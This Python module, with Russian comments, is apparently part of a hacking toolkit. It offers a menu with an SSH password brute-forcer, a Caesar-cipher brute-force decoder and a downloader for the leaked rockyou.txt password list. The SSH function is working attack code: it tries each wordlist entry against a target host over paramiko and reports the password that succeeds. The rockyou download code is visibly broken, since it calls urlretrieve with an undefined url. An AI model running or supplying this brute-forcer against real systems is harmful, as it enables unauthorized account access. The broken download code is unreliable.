from Modules import HEAD, TERM
def choose(): 
	brtf="" # Создаём нулевую переменную
	while brtf not in TERM.Command_ADDT["Back"]: 
		brtf=input("[root@"+TERM.Hostname+" brtf]# ")
		if   brtf in TERM.Command_BRTF["SSH"]: ssh() # При единице сработает функция ssh
		elif brtf in TERM.Command_BRTF["Caesar"]: caesar() # При двойке сработает функция caesar
		elif brtf in TERM.Command_BRTF["RockYou"]: rockyou() # При двойке сработает функция rockyou								
		elif brtf in TERM.Command_ADDT["Check"]: title() # Проверка модулей
		elif brtf in TERM.Command_ADDT["Help"]: HEAD.help() # Предоставление информации о командах
		elif brtf in TERM.Command_ADDT["Info"]: HEAD.info() # Дополнительная информация
		elif brtf in TERM.Command_ADDT["Clear"]: HEAD.clear() # Очистка истории
		elif brtf in TERM.Command_ADDT["Back"]: continue # Выход из модуля
		elif brtf in TERM.Command_ADDT["Exit"]: raise SystemExit # Выход из программы
		else: print("?:",brtf,":command not found") # Если не указаны вышеперечисленные условия

def title(): # Предоставление информации о модуле Scanners
	print(HEAD.Line["full-"]+"\n[>] Write the number:")
	print("\t1) SSH.571\n\t2) CAESAR.571\n"+HEAD.Line["nfull-"]+"\n\t0) ROCKYOU.TXT >> download\n"+HEAD.Line["full-"])

def rockyou(): # Скачивание словаря rockyou.txt
	import urllib.request
	print(HEAD.Line["full-"]+"\n"+HEAD.Line["brtf"]+"\n"+HEAD.Line["full-"])
	print("[*] File size = [140MB]") # Начало работы
	print("[!] Downloading",end="") # 'Графическая' составляющая
	from time import sleep
	for i in range(3): 
		sleep(0.5) 
		print('.', end='', flush=True)
	try:
		def download(url): name="rockyou.txt"
		urllib.request.urlretrieve(url,name) # Указываем имя файла
		download("http://scrapmaker.com/data/wordlists/dictionaries/rockyou.txt") # Указываем url ссылку на файл
	except: # Если файл по url не был найден
		print("\n[x] Error: file is not saved! ") 
	else: # Если файл успешно был скачан
		print("\n[+] File: 'rockyou.txt' successfully saved!") 
	finally: # Завершение работы
		print(HEAD.Line["full-"]) 

def caesar():
	arr1=['A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z']
	print(HEAD.Line["full-"]+"\n"+HEAD.Line["brtf"]+"\n"+HEAD.Line["full-"])
	msg=input(HEAD.Line["full-"]+"\nWrite the crypted text: ") # Ввод зашифрованного текста
	print(HEAD.Line["full-"]+"\nAll possible variants of decoding: \n"+HEAD.Line["full-"])
	for number in range(len(arr1)): # Создание нового списка из аналогичных символов
		arr2=list(map(lambda x:x,arr1))
		def change_arr2(): # Подбор символов под зашифрованное сообщение
			for i in range(number): 
				arr2.append(arr2[0])
				arr2.remove(arr2[0])
		change_arr2() 
		msgd="" # Объявление переменной для расшифрованного текста
		for i in msg: # Посимвольное чтение зашифрованного сообщения
			if i==" ": 
				msgd+=" " # Если пробел в зашифрованном тексте- не изменять ничего
			else: # Иначе если символ зашифрованного текста аналогичен с 
				for j in range(len(arr1)):  # символом списка
					if i==arr2[j]: 
						msgd+=arr1[j] # то добавить в переменную данный символ
		print("[Possible variant] "+str(msgd))
	print(HEAD.Line["full-"])

def ssh():
	import paramiko,sys,os,socket
	global host,username,line,input_file # Объявление глобальных переменных
	print(HEAD.Line["full-"]+"\n"+HEAD.Line["brtf"]+"\n"+HEAD.Line["full-"])
	try:
		host=input("[*] Enter target Host address: ") # Host адрес (пример: 192.168.0.100)
		username=input("[*] Enter SSH username: ") # SSH имя (пример: user)
		input_file=input("[*] Enter SSH Password List: ") # Словарь с паролями
		if os.path.exists(input_file)==False: # Если путь к словарю не был найден
			print("\n[*] File Path Does Not Exists!") # Выдать ошибку и выйти из программы
			raise SystemExit
	except KeyboardInterrupt:
		print("\n\n[*] User requested an interrupt") # Выдать ошибку и выйти из программы
		raise SystemExit
	def ssh_connect(password,code=0):
		ssh=paramiko.SSHClient() # Подключение к ssh
		ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
		try: # Попытка связать юзера и пароль
			ssh.connect(host,port=22,username=username,password=password) 
		except paramiko.AuthenticationException: 
			code=1
		except socket.error as e: 
			code=2
		ssh.close() # Ре-подключение
		return code
	input_file=open(input_file) # Словарь с паролями
	for i in input_file.readlines():
		password=i.strip("\n") 
		try:
			response=ssh_connect(password) # Проверка пароля
			if response==0: # Пароль найден
				print("%s\n[*] User: %s [*] Pass Found: %s\n%s" % (HEAD.Line["full-"],username,password,HEAD.Line["full-"]))
				sys.exit(0) 
			elif response==1: # Пароль не верный
				print("[*] User: %s [*] Pass: %s (Password Incorrect)" % (username,password)) 
			elif response==2: # Не возможно подключиться к адресу
				print("Connection Could Not Be Established to Address: %s" %(host)); raise SystemExit 
		except: # При возникновении ошибки - выключить
			raise SystemExit 
	input_file.close()